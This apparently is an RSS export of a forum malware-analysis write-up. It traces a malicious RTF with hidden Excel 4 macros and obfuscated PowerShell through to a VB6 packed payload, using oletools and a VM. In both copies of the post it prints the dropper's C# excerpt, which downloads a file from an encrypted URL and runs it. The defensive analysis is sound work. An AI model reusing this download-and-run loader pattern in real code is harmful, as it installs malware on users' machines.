<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Analyzing Modern Malware Techniques - Part 2</title>
    <link>https://0x00sec.org/t/analyzing-modern-malware-techniques-part-2/18765</link>
    <description>## Analyzing Modern Malware Techniques - Part 2
### A case of Powershell, Excel 4 Macros and VB6(part 1 of 2)


**Preface:**
In continuation of my previous article, I wanted to focus on the next techniques I listed in my previous article(Macros and Powershell), these go under the category of LOLbins(How people don’t die laughing from just saying that noun is beyond me). These LOLbins(haha) are used to Live off the land(LOL, haha again) which means the malware will utilize windows tools to avoid detection. From being active on twitter and being updated in current threat attack news, macros and powershell seem to be the main attack vector when it comes to your average malware campaign. while one like me who enjoys getting his hands dirty with assembly I was not very excited to dig into this but what I found, though not that special, proved to be quite a challenge to analyze for a novice like me(maybe I should be more humble). Anyway let’s begin!

**Background knowledge required:**

1. Knowledge in C and Assembly
2. Knowledge in WINAPI
3. Knowledge in IDA and x64dbg
4. Novice experience with analyzing obfuscated scripts

**Tools used**

1. Any.Run
2. OLETools
3. IDA
4. PEBear and PEID
5. Resource Hacker
6. Powershell ISE

**Sample:**

https://app.any.run/tasks/f2ea6ff2-f7f9-4174-8c0c-0f3840a56a16/

**Basic Static &amp; Dynamic Analysis:**

In order to find the [sample](https://app.any.run/tasks/f2ea6ff2-f7f9-4174-8c0c-0f3840a56a16/), I performed a simple search on the amazing platform called [Any Run](https://app.any.run/tasks/f2ea6ff2-f7f9-4174-8c0c-0f3840a56a16/), which allows you to perform a basic static and dynamic analysis of a sample you upload into it. Not only that, but in addition it allows you to download the samples off the platform for free(there are some cool payed features such as running a 64bit VM or setting up a specific VM with different language settings etc).

This malware seems to perform a lot of things, and it&#39;s not what I’d call very stealthy:

![|470x339](upload://7hcloseMeOtfSe5tN6l4ZjQC4d3.png)

First word executes, then 5 excel processes launch, which all execute powershell. then csc.exe executes which is marked with a little bug sign which means Any.Run identified it as malicious. Each excel process launches a powershell process which launches the malware in return. the malware seems to launch cvtres.exe which is a legit Microsoft application and holds the following description:

&gt; “Microsoft® Resource File To COFF Object Conversion Utility”

There is more information here, but I want to leave that to us to figure out because its fun.

Analysis goals of malicious documents:

I have never analyzed malicious documents before this blog post, but I always work with predefined goals. A [cheat sheet](https://zeltser.com/analyzing-malicious-documents/) from Lenny Zeltser which provides some help on how to approach such a task.

So first we answer:
&gt; “Examine the document for anomalies, such as risky tags, scripts, or other anomalous aspects.”

Well easy, we go to Any.Run and click info:
![|602x101](upload://9SHyk8FT8zS2wsCjLX1sgAIwhQC.png)

This file is an RFT document, but then Lenny states:
&gt; “RTF documents don’t support macros, but can contain other files embedded as OLE1 objects.”

I didn’t know this but RFT files auto run office files embedded inside of them.
[This ](https://cofense.com/rtf-malware-delivery/)article explains how this might be executed in depth.
So next we must located the embedded objects, using the cheat sheet we download **[oletools](https://www.decalage.info/python/oletools)** and execute **rftobj.py** to dump embedded OLE objects that might be stored inside of the RFT file.

![|488x454](upload://3XeELULIYOFYHg81YpW0eEyhTCE.png)

We got 5 excel sheets, all with the same name and MD5 hash. Interesting, since these are all the same file we can probably assume that we can just analyze one of them.

lets dump these files using the rtfdump.py(**rtfdump.py file.rtf -s 5 -H -d &gt; out.bin**) command. Then I used olevba.py on the dumped excel file to dump or check for vba code:

![|602x347](upload://frsUrKYiFq4QnjVFIq0BIH7o3n8.png)

The code is heavily obfuscated and its not just a VBA macro, its an XLM macro. These macros are old and date back to 1993 and are not in use today, but of course malware authors use them to trick AV’s since most security solutions ignore these. In addition, the usage of **Shell**(listed in red and marked suspicious in the picture) instantly worries me as this command is used to execute its parameters through **cmd**.

So lets extract the VBA by executing oledump.py &lt;excelfilename&gt; again:

![|602x236](upload://wXjM8xm2WNV7L3SiKKCNzMvqGxk.png)

Stream number **10** contains the letter ‘**M**’ next to it, which indicates that this is a Macro object. Lets issue **oledump.py -s 10 -v &lt;excelfilename&gt;** and copy the code from the shell(this can be also executed with [officemalscanner](http://www.reconstructer.org/code/OfficeMalScanner.zip)).

Now let’s beautify the code we extracted:![|576x659](upload://1lJnOKsxbdwvS2sffNs8fs1Ephy.png)

One can only laugh from viewing the names the author chose to use. We can either debug this code and try to understand what it does or we can edit it.

We can simply replace the **Shell** command with **Debug.print(nuzzle)** to view the executed code, the only problem is that we need to access the workbook itself.

I tried to do it without opening the **XLM** file itself but because it was an **XLM** file no available tool would interact with it so I had to access it myself in the VM.

So let’s open up the **XLM**.

![|602x77](upload://ddZ704d0khnUxdN9wihWjhOC3aU.png)

We click Yes but in the next prompt disable the macros on the first run. The next question I asked was how do I enter the VBA editor and where the hell is that excel worksheet. The first question is easy to [answer](https://support.office.com/en-us/article/show-the-developer-tab-e1192344-5e56-4d45-931b-e5fd9bea2d45). The second took me about 3 hours.

I’ll save those 3 hours for you(and the fact that you don’t need to unhide it cause the macro will run anyway), the sheet is hidden and it can be viewed by entering the View tab and clicking Unhide.

![|570x150](upload://slFV3ugXQUed0keqp5CSh8XBMXW.png)

And this allows us to view cell **(136,8)** and **(135,8)**. the cell value located in row 136 is really long and probably is the actual payload, so let&#39;s open the developer tab and access the macro itself, replace the obfuscated script with the clean one and then edit Shell command then execute the macro.

![|459x191](upload://gSQKYV1ztwpcQWcw9eeVHgi6hoR.png)

Will print debug information into the console which can be activated by pressing control+G.

![|602x411](upload://cCdXdol0N38lPrdr3mGo5WZSHQe.png)

Scary, but do not worry as this can be de obfuscated really easily. let&#39;s look at the 7th line - **$g3b4e42 = r8dc5($g3b4e4)**. I can assume that **r8dc5** is some kind of decrypting function as it takes the long input parameter of **g3b4e4**. So all we have to do, is see the contents of **g3b4e4** after the code decrypts it.

I scanned the internet for a while and realized the best way to do this is using PowerShell ISE which is the Windows IDE for building and scripting powershell scripts.

The correct way to execute this is simply to copy the line 2 to 7. as for some reason powershell will not execute with line 1, in addition we don&#39;t want line 8 - 9 because they might execute the code itself.

and to finalize our script will utilize the Write-Host command which is the equivalent of print() in python to print out **$g3b4e42**.

![|602x117](upload://xlQS0o74U778VLQ3bNTGp8hFlAd.png)

Lets copy this script into Sublime:

![|602x225](upload://7PMuRDQz1oB7oMQSj8G4WR5c7j1.png)

We can see imports being made to GetProcAddress, LoadLibrary and VirtualProtect but I&#39;m only interested in code located in the red box.

    WebClient ee86b=new WebClient();

    string e17362=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+&quot;\\aab37

    &quot;+r8dc5(&quot;57534106&quot;);

    ee86b.DownloadFile(r8dc5(&quot;11424d135b5619580e000b575a0b08575450194e10515b0c030c534

    3064f1c4e5c&quot;),e17362);

    ProcessStartInfo f636b4c=new ProcessStartInfo(e17362);

    Process.Start(f636b4c);

We can tell from this code that a file will be downloaded and saved in a folder, then a process will start with the handle to the downloaded file(I assume), and I’m not going to be bothered to confirm it because it doesn&#39;t matter to us. We want the binary to be downloaded. so we must run the same previous **r8dc5** function to decrypt the input it gets to download the file!

![|602x36](upload://u6XkjkQvwFXVhEs0tRimZ5csQcg.png)

Yay! we got it! but alas this domain is already down?![|602x229](upload://dhkzgExrJSeGosOqwsJo7TNN0pk.png)

Well.. it’s hard to say, because if we check the connections made to this domain from the any.run platform we can see that the powershell got this exact same response.

![|602x407](upload://274pk1k14LWaNLGNt0kaFO1dYdu.png)

but we can try finding the sample to be downloaded if we simply google it.

[urlhaus](https://urlhaus.abuse.ch/url/292461/) leads to [Virus total](https://www.virustotal.com/gui/file/e6ffb945247085ceb6b2478c643dc337a35d5c0c17d2e4709c3a5842c9bcb3e3/detection) which gives us the SHA256 hash of this file(which only 13 AV engines detected as of this date!) and a google search of that leads to [hybrid-analysis](https://hybrid-analysis.com/sample/e6ffb945247085ceb6b2478c643dc337a35d5c0c17d2e4709c3a5842c9bcb3e3?environmentId=120), and from there we can get the raw sample(or 0x00sec users can just use getsample in the discord malware channel).

I downloaded the sample and ran it in PEID:

![|536x306](upload://hn4W5pDQ0Jieb5sU1SfjBjn2rjS.png)

Alright, Vb6? Lets see how it looks in IDA:

![|602x351](upload://39BCGNuSIilZa9q6yNOMBFa9FxA.png)

So as soon as I got released from the hospital from the seizure I got from looking at the disassembly I decided to start digging further.

as the following [virus bullet-in](https://www.virusbulletin.com/virusbulletin/2014/07/not-old-enough-be-forgotten-new-chic-visual-basic-6) paper states:

&gt; &quot;...The laughing vs. crying aspect of VB6 is primarily related to the fact that VB6 internals lack any sort of official documentation. The inner workings of the VB6 virtual machine and the functionality of its exported functions are literally a mystery to anyone who has not taken an in-depth look at msvbvm60.dll.
&gt; 
&gt; For native code reversing, it is crucial to understand the challenges of event-driven binaries. Also, the reverser must interpret the functionality of the VB6 APIs called from the binary. But, given that malware executes pretty linearly by nature, and the VB6 APIs are mostly assigned understandable names, native code reversing is just another colourful facet of x86 binaries...”

I knew I was in for a treat :).

Digging further I found the following [article](https://r0r5ch4ch.blogspot.com/2019/12/3-levels-of-unpacking-for-newbies-part.html) which introduced me to this [IDC Ida script](https://www.hex-rays.com/products/ida/support/freefiles/vb.idc) which did make things a bit more readable in IDA view. These articles also mention this tool called [VB Decompiler ](https://www.vb-decompiler.org/)which I decided to use, or at least try and get some results and it worked!

![|602x347](upload://dSsktVuJWDAyYr7KSibcScheByY.png)
In addition to this finding, I launched the binary in the resource hacker tool and found a suspicious image inside:

![|602x263](upload://lUHxhhpzpPhNVlZFwSBwULrOK1x.png)

This leads me to believe that this might be a VB6 packer and it uses this image to unpack another executable.

**Conclusion:**

In this part of the article we demonstrated how might a malware analyst approach analyzing a maldoc, we learned that again - goal setting and understanding the bigger picture can save time in the process of malware analysis.

As this finding led me to a completely new binary I would like to dedicate the next part of this series to analyzing this malware but I would be doing so in a different post. Till next time :) (probably this weekend)

Sources used:

https://www.virusbulletin.com/virusbulletin/2014/07/not-old-enough-be-forgotten-new-chic-visual-basic-6
https://r0r5ch4ch.blogspot.com/2019/12/3-levels-of-unpacking-for-newbies-part.html
https://www.vb-decompiler.org/
https://blog.avira.com/new-malware-in-old-excel-skins/
https://cofense.com/rtf-malware-delivery/</description>
    
    <lastBuildDate>Thu, 23 Jan 2020 23:15:19 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/analyzing-modern-malware-techniques-part-2/18765.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Analyzing Modern Malware Techniques - Part 2</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/analyzing-modern-malware-techniques-part-2/18765/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/analyzing-modern-malware-techniques-part-2/18765/2</link>
        <pubDate>Sun, 24 May 2020 12:49:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18765-2</guid>
        <source url="https://0x00sec.org/t/analyzing-modern-malware-techniques-part-2/18765.rss">Analyzing Modern Malware Techniques - Part 2</source>
      </item>
      <item>
        <title>Analyzing Modern Malware Techniques - Part 2</title>
        <dc:creator><![CDATA[Danus]]></dc:creator>
        <description><![CDATA[
            <h2>Analyzing Modern Malware Techniques - Part 2</h2>
<h3>A case of Powershell, Excel 4 Macros and VB6(part 1 of 2)</h3>
<p><strong>Preface:</strong><br>
In continuation of my previous article, I wanted to focus on the next techniques I listed in my previous article(Macros and Powershell), these go under the category of LOLbins(How people don’t die laughing from just saying that noun is beyond me). These LOLbins(haha) are used to Live off the land(LOL, haha again) which means the malware will utilize windows tools to avoid detection. From being active on twitter and being updated in current threat attack news, macros and powershell seem to be the main attack vector when it comes to your average malware campaign. while one like me who enjoys getting his hands dirty with assembly I was not very excited to dig into this but what I found, though not that special, proved to be quite a challenge to analyze for a novice like me(maybe I should be more humble). Anyway let’s begin!</p>
<p><strong>Background knowledge required:</strong></p>
<ol>
<li>Knowledge in C and Assembly</li>
<li>Knowledge in WINAPI</li>
<li>Knowledge in IDA and x64dbg</li>
<li>Novice experience with analyzing obfuscated scripts</li>
</ol>
<p><strong>Tools used</strong></p>
<ol>
<li>Any.Run</li>
<li>OLETools</li>
<li>IDA</li>
<li>PEBear and PEID</li>
<li>Resource Hacker</li>
<li>Powershell ISE</li>
</ol>
<p><strong>Sample:</strong></p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://app.any.run/img/favicon.ico" class="site-icon" width="16" height="16">
      <a href="https://app.any.run/tasks/f2ea6ff2-f7f9-4174-8c0c-0f3840a56a16/" target="_blank" rel="noopener nofollow ugc">app.any.run</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/388;"><img src="/uploads/default/original/2X/2/2349c6805d54e750452508588b29d886f1d5913a.jpeg" class="thumbnail" width="690" height="388" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2349c6805d54e750452508588b29d886f1d5913a_2_10x10.png"></div>

<h3><a href="https://app.any.run/tasks/f2ea6ff2-f7f9-4174-8c0c-0f3840a56a16/" target="_blank" rel="noopener nofollow ugc">13efbd134cf79e4381dd6bdefc0862c754389cdeef16b604ba0fe4c8531207c3 (MD5:...</a></h3>

<p>Interactive malware hunting service. Any environments ready for live testing most type of threats. Without install. Without waiting.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><strong>Basic Static &amp; Dynamic Analysis:</strong></p>
<p>In order to find the <a href="https://app.any.run/tasks/f2ea6ff2-f7f9-4174-8c0c-0f3840a56a16/" rel="noopener nofollow ugc">sample</a>, I performed a simple search on the amazing platform called <a href="https://app.any.run/tasks/f2ea6ff2-f7f9-4174-8c0c-0f3840a56a16/" rel="noopener nofollow ugc">Any Run</a>, which allows you to perform a basic static and dynamic analysis of a sample you upload into it. Not only that, but in addition it allows you to download the samples off the platform for free(there are some cool payed features such as running a 64bit VM or setting up a specific VM with different language settings etc).</p>
<p>This malware seems to perform a lot of things, and it’s not what I’d call very stealthy:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/3/3300ee4449dc4bc3157b8042cb7a47c961829f29.png" data-download-href="/uploads/short-url/7hcloseMeOtfSe5tN6l4ZjQC4d3.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3300ee4449dc4bc3157b8042cb7a47c961829f29_2_470x339.png" alt="" data-base62-sha1="7hcloseMeOtfSe5tN6l4ZjQC4d3" width="470" height="339" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3300ee4449dc4bc3157b8042cb7a47c961829f29_2_470x339.png, https://0x00sec.s3.amazonaws.com/optimized/2X/3/3300ee4449dc4bc3157b8042cb7a47c961829f29_2_705x508.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/3/3300ee4449dc4bc3157b8042cb7a47c961829f29_2_940x678.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3300ee4449dc4bc3157b8042cb7a47c961829f29_2_10x10.png"></a></div><p></p>
<p>First word executes, then 5 excel processes launch, which all execute powershell. then csc.exe executes which is marked with a little bug sign which means Any.Run identified it as malicious. Each excel process launches a powershell process which launches the malware in return. the malware seems to launch cvtres.exe which is a legit Microsoft application and holds the following description:</p>
<blockquote>
<p>“Microsoft® Resource File To COFF Object Conversion Utility”</p>
</blockquote>
<p>There is more information here, but I want to leave that to us to figure out because its fun.</p>
<p>Analysis goals of malicious documents:</p>
<p>I have never analyzed malicious documents before this blog post, but I always work with predefined goals. A <a href="https://zeltser.com/analyzing-malicious-documents/" rel="noopener nofollow ugc">cheat sheet</a> from Lenny Zeltser which provides some help on how to approach such a task.</p>
<p>So first we answer:</p>
<blockquote>
<p>“Examine the document for anomalies, such as risky tags, scripts, or other anomalous aspects.”</p>
</blockquote>
<p>Well easy, we go to Any.Run and click info:<br>
<img src="/uploads/default/original/2X/4/45428fd738c55b6fd5a41de051eb74c1701d5e42.png" alt="" data-base62-sha1="9SHyk8FT8zS2wsCjLX1sgAIwhQC" width="602" height="101"></p>
<p>This file is an RFT document, but then Lenny states:</p>
<blockquote>
<p>“RTF documents don’t support macros, but can contain other files embedded as OLE1 objects.”</p>
</blockquote>
<p>I didn’t know this but RFT files auto run office files embedded inside of them.<br>
<a href="https://cofense.com/rtf-malware-delivery/" rel="noopener nofollow ugc">This </a>article explains how this might be executed in depth.<br>
So next we must located the embedded objects, using the cheat sheet we download <strong><a href="https://www.decalage.info/python/oletools" rel="noopener nofollow ugc">oletools</a></strong> and execute <strong>rftobj.py</strong> to dump embedded OLE objects that might be stored inside of the RFT file.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/1/1bb8b8ef6f4d3cd33c8b2448f77d9f0fc09bf650.png" data-download-href="/uploads/short-url/3XeELULIYOFYHg81YpW0eEyhTCE.png?dl=1" title=""><img src="/uploads/default/original/2X/1/1bb8b8ef6f4d3cd33c8b2448f77d9f0fc09bf650.png" alt="" data-base62-sha1="3XeELULIYOFYHg81YpW0eEyhTCE" width="488" height="454" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1bb8b8ef6f4d3cd33c8b2448f77d9f0fc09bf650_2_10x10.png"></a></div><p></p>
<p>We got 5 excel sheets, all with the same name and MD5 hash. Interesting, since these are all the same file we can probably assume that we can just analyze one of them.</p>
<p>lets dump these files using the rtfdump.py(<strong>rtfdump.py file.rtf -s 5 -H -d &gt; out.bin</strong>) command. Then I used olevba.py on the dumped excel file to dump or check for vba code:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/6/6c3b6fed17c24da9ec512be9da04e3975e5da576.png" data-download-href="/uploads/short-url/frsUrKYiFq4QnjVFIq0BIH7o3n8.png?dl=1" title=""><img src="/uploads/default/original/2X/6/6c3b6fed17c24da9ec512be9da04e3975e5da576.png" alt="" data-base62-sha1="frsUrKYiFq4QnjVFIq0BIH7o3n8" width="602" height="347" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6c3b6fed17c24da9ec512be9da04e3975e5da576_2_10x10.png"></a></div><p></p>
<p>The code is heavily obfuscated and its not just a VBA macro, its an XLM macro. These macros are old and date back to 1993 and are not in use today, but of course malware authors use them to trick AV’s since most security solutions ignore these. In addition, the usage of <strong>Shell</strong>(listed in red and marked suspicious in the picture) instantly worries me as this command is used to execute its parameters through <strong>cmd</strong>.</p>
<p>So lets extract the VBA by executing oledump.py  again:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/e/e6fa281c113d06b7b1c7bb4f9cadd210cc7bd21a.png" data-download-href="/uploads/short-url/wXjM8xm2WNV7L3SiKKCNzMvqGxk.png?dl=1" title=""><img src="/uploads/default/original/2X/e/e6fa281c113d06b7b1c7bb4f9cadd210cc7bd21a.png" alt="" data-base62-sha1="wXjM8xm2WNV7L3SiKKCNzMvqGxk" width="602" height="236" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e6fa281c113d06b7b1c7bb4f9cadd210cc7bd21a_2_10x10.png"></a></div><p></p>
<p>Stream number <strong>10</strong> contains the letter ‘<strong>M</strong>’ next to it, which indicates that this is a Macro object. Lets issue <strong>oledump.py -s 10 -v </strong> and copy the code from the shell(this can be also executed with <a href="http://www.reconstructer.org/code/OfficeMalScanner.zip" rel="noopener nofollow ugc">officemalscanner</a>).</p>
<p>Now let’s beautify the code we extracted:</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/0/09770f9b3ebeee1a7d639cf1a2f13c1b60f984b4.png" data-download-href="/uploads/short-url/1lJnOKsxbdwvS2sffNs8fs1Ephy.png?dl=1" title=""><img src="/uploads/default/original/2X/0/09770f9b3ebeee1a7d639cf1a2f13c1b60f984b4.png" alt="" data-base62-sha1="1lJnOKsxbdwvS2sffNs8fs1Ephy" width="437" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/09770f9b3ebeee1a7d639cf1a2f13c1b60f984b4_2_10x10.png"></a></div><p></p>
<p>One can only laugh from viewing the names the author chose to use. We can either debug this code and try to understand what it does or we can edit it.</p>
<p>We can simply replace the <strong>Shell</strong> command with <strong>Debug.print(nuzzle)</strong> to view the executed code, the only problem is that we need to access the workbook itself.</p>
<p>I tried to do it without opening the <strong>XLM</strong> file itself but because it was an <strong>XLM</strong> file no available tool would interact with it so I had to access it myself in the VM.</p>
<p>So let’s open up the <strong>XLM</strong>.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/5/5cb0fbcdfc427e985169bf8c71fe30fed2983240.png" data-download-href="/uploads/short-url/ddZ704d0khnUxdN9wihWjhOC3aU.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5cb0fbcdfc427e985169bf8c71fe30fed2983240_2_602x77.png" alt="" data-base62-sha1="ddZ704d0khnUxdN9wihWjhOC3aU" width="602" height="77" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5cb0fbcdfc427e985169bf8c71fe30fed2983240_2_602x77.png, https://0x00sec.s3.amazonaws.com/optimized/2X/5/5cb0fbcdfc427e985169bf8c71fe30fed2983240_2_903x115.png 1.5x, /uploads/default/original/2X/5/5cb0fbcdfc427e985169bf8c71fe30fed2983240.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5cb0fbcdfc427e985169bf8c71fe30fed2983240_2_10x10.png"></a></div><p></p>
<p>We click Yes but in the next prompt disable the macros on the first run. The next question I asked was how do I enter the VBA editor and where the hell is that excel worksheet. The first question is easy to <a href="https://support.office.com/en-us/article/show-the-developer-tab-e1192344-5e56-4d45-931b-e5fd9bea2d45" rel="noopener nofollow ugc">answer</a>. The second took me about 3 hours.</p>
<p>I’ll save those 3 hours for you(and the fact that you don’t need to unhide it cause the macro will run anyway), the sheet is hidden and it can be viewed by entering the View tab and clicking Unhide.</p>
<p><img src="/uploads/default/original/2X/c/c6b0242fdd597703a8fe79fa7b3bf8a7f4a3e10c.png" alt="" data-base62-sha1="slFV3ugXQUed0keqp5CSh8XBMXW" width="570" height="150"></p>
<p>And this allows us to view cell <strong>(136,8)</strong> and <strong>(135,8)</strong>. the cell value located in row 136 is really long and probably is the actual payload, so let’s open the developer tab and access the macro itself, replace the obfuscated script with the clean one and then edit Shell command then execute the macro.</p>
<p><img src="/uploads/default/original/2X/7/7656135f0cafe45a31a3340215ff9a997c5f6a79.png" alt="" data-base62-sha1="gSQKYV1ztwpcQWcw9eeVHgi6hoR" width="459" height="191"></p>
<p>Will print debug information into the console which can be activated by pressing control+G.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/5/586c4191ff65d0d81550c6160c3237383cd1f672.png" data-download-href="/uploads/short-url/cCdXdol0N38lPrdr3mGo5WZSHQe.png?dl=1" title=""><img src="/uploads/default/original/2X/5/586c4191ff65d0d81550c6160c3237383cd1f672.png" alt="" data-base62-sha1="cCdXdol0N38lPrdr3mGo5WZSHQe" width="602" height="411" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/586c4191ff65d0d81550c6160c3237383cd1f672_2_10x10.png"></a></div><p></p>
<p>Scary, but do not worry as this can be de obfuscated really easily. let’s look at the 7th line - <strong>$g3b4e42 = r8dc5($g3b4e4)</strong>. I can assume that <strong>r8dc5</strong> is some kind of decrypting function as it takes the long input parameter of <strong>g3b4e4</strong>. So all we have to do, is see the contents of <strong>g3b4e4</strong> after the code decrypts it.</p>
<p>I scanned the internet for a while and realized the best way to do this is using PowerShell ISE which is the Windows IDE for building and scripting powershell scripts.</p>
<p>The correct way to execute this is simply to copy the line 2 to 7. as for some reason powershell will not execute with line 1, in addition we don’t want line 8 - 9 because they might execute the code itself.</p>
<p>and to finalize our script will utilize the Write-Host command which is the equivalent of print() in python to print out <strong>$g3b4e42</strong>.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/e/e9c01f58fdd4b5eed470d5df2749d466f7966021.png" data-download-href="/uploads/short-url/xlQS0o74U778VLQ3bNTGp8hFlAd.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e9c01f58fdd4b5eed470d5df2749d466f7966021_2_602x117.png" alt="" data-base62-sha1="xlQS0o74U778VLQ3bNTGp8hFlAd" width="602" height="117" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e9c01f58fdd4b5eed470d5df2749d466f7966021_2_602x117.png, https://0x00sec.s3.amazonaws.com/optimized/2X/e/e9c01f58fdd4b5eed470d5df2749d466f7966021_2_903x175.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/e/e9c01f58fdd4b5eed470d5df2749d466f7966021_2_1204x234.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/e/e9c01f58fdd4b5eed470d5df2749d466f7966021_2_10x10.png"></a></div><p></p>
<p>Lets copy this script into Sublime:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/3/36e9b4ee26720ffec93d88f3ab3ef431ab3de987.png" data-download-href="/uploads/short-url/7PMuRDQz1oB7oMQSj8G4WR5c7j1.png?dl=1" title=""><img src="/uploads/default/original/2X/3/36e9b4ee26720ffec93d88f3ab3ef431ab3de987.png" alt="" data-base62-sha1="7PMuRDQz1oB7oMQSj8G4WR5c7j1" width="602" height="225" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/36e9b4ee26720ffec93d88f3ab3ef431ab3de987_2_10x10.png"></a></div><p></p>
<p>We can see imports being made to GetProcAddress, LoadLibrary and VirtualProtect but I’m only interested in code located in the red box.</p>
<pre><code>WebClient ee86b=new WebClient();

string e17362=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"\\aab37

"+r8dc5("57534106");

ee86b.DownloadFile(r8dc5("11424d135b5619580e000b575a0b08575450194e10515b0c030c534

3064f1c4e5c"),e17362);

ProcessStartInfo f636b4c=new ProcessStartInfo(e17362);

Process.Start(f636b4c);
</code></pre>
<p>We can tell from this code that a file will be downloaded and saved in a folder, then a process will start with the handle to the downloaded file(I assume), and I’m not going to be bothered to confirm it because it doesn’t matter to us. We want the binary to be downloaded. so we must run the same previous <strong>r8dc5</strong> function to decrypt the input it gets to download the file!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/d/d30a8a2e277c17eddc7e69ac6c84d7fab330f748.png" data-download-href="/uploads/short-url/u6XkjkQvwFXVhEs0tRimZ5csQcg.png?dl=1" title=""><img src="/uploads/default/original/2X/d/d30a8a2e277c17eddc7e69ac6c84d7fab330f748.png" alt="" data-base62-sha1="u6XkjkQvwFXVhEs0tRimZ5csQcg" width="602" height="36" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/d30a8a2e277c17eddc7e69ac6c84d7fab330f748_2_10x10.png"></a></div><p></p>
<p>Yay! we got it! but alas this domain is already down?</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/5/5d11d01e5491cf53818b76f45c9ab6e4798be28a.png" data-download-href="/uploads/short-url/dhkzgExrJSeGosOqwsJo7TNN0pk.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5d11d01e5491cf53818b76f45c9ab6e4798be28a_2_602x229.png" alt="" data-base62-sha1="dhkzgExrJSeGosOqwsJo7TNN0pk" width="602" height="229" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5d11d01e5491cf53818b76f45c9ab6e4798be28a_2_602x229.png, https://0x00sec.s3.amazonaws.com/optimized/2X/5/5d11d01e5491cf53818b76f45c9ab6e4798be28a_2_903x343.png 1.5x, /uploads/default/original/2X/5/5d11d01e5491cf53818b76f45c9ab6e4798be28a.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5d11d01e5491cf53818b76f45c9ab6e4798be28a_2_10x10.png"></a></div><p></p>
<p>Well… it’s hard to say, because if we check the connections made to this domain from the any.run platform we can see that the powershell got this exact same response.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/0/0ed0f93d14aac49fb998aeba50518617a2d6dddc.png" data-download-href="/uploads/short-url/274pk1k14LWaNLGNt0kaFO1dYdu.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0ed0f93d14aac49fb998aeba50518617a2d6dddc_2_602x407.png" alt="" data-base62-sha1="274pk1k14LWaNLGNt0kaFO1dYdu" width="602" height="407" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0ed0f93d14aac49fb998aeba50518617a2d6dddc_2_602x407.png, /uploads/default/original/2X/0/0ed0f93d14aac49fb998aeba50518617a2d6dddc.png 1.5x, /uploads/default/original/2X/0/0ed0f93d14aac49fb998aeba50518617a2d6dddc.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0ed0f93d14aac49fb998aeba50518617a2d6dddc_2_10x10.png"></a></div><p></p>
<p>but we can try finding the sample to be downloaded if we simply google it.</p>
